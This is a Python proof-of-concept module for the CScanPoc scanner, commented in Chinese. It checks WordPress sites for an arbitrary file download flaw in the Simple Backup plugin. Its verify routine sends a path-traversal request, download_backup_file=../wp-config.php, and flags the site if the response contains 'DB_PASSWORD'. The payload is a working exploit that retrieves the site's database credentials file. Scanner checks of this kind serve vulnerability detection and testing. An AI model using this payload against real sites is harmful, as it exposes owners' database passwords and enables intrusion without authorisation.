# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = '19b8fa4f-4d28-4f5a-9c22-afdfa1ec1d85'
    name = 'WordPress Simple Backup Plugin 任意下载漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-06-06'  # 漏洞公布时间
    desc = '''
        WordPress Simple Backup Plugin 任意下载漏洞。
    ''' # 漏洞描述
    ref = 'Unkonwn' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Simple Backup Plugin'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fd039bbf-346a-4c89-a146-5a68c02d3be4'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/wp-admin/tools.php?page=backup_manager&download_backup_file=../wp-config.php"
            url = '{target}'.format(target=self.target)+payload
            code, head, res, _, _ = hh.http(url)
                       
            if code == 200 and res.find('DB_PASSWORD') != -1:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()